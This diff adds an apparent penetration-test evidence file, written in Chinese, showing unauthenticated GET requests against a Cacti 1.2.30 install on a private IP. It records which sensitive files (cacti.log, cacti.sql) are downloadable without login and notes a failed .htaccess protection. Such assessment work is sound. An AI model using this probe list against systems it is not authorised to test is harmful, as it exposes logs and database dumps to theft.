@@ -1,0 +1,17 @@
+### Cacti 1.2.30 未认证敏感文件暴露 —— 请求/响应证据
+### 目标: http://192.168.188.x/cacti     时间: 2026-09-18 09:57:14
+### 方式：无 Cookie 的未认证 GET（零凭据）
+------------------------------------------------------------------------------
+GET /cacti/log/cacti.log         -> HTTP 200   Content-Length=44516705   Content-Type=-
+      首行: 04/24/2026 11:24:04 - ERROR PHP WARNING: Undefined array key "localhost:3306:cacti" in file: /va
+GET /cacti/cacti.sql             -> HTTP 200   Content-Length=127216     Content-Type=application/sql
+      首行: /*
+GET /cacti/log/                  -> HTTP 302   Content-Length=0          Content-Type=text/html; charset=UTF-8
+GET /cacti/log/.htaccess         -> HTTP 403   Content-Length=280        Content-Type=text/html; charset=iso-8859-1
+GET /cacti/include/config.php    -> HTTP 200   Content-Length=0          Content-Type=text/html; charset=UTF-8
+GET /cacti/CHANGELOG             -> HTTP 200   Content-Length=287113     Content-Type=-
+      首行: Cacti CHANGELOG
+------------------------------------------------------------------------------
+结论：/cacti/log/cacti.log 与 /cacti/cacti.sql 未认证即可下载；
+      /cacti/log/ 为 302（无目录列表），/cacti/log/.htaccess 为 403（防护文件存在但规则未生效）；
+      /cacti/include/config.php 为 200 且正文为空（PHP 正常执行，未泄源码）。
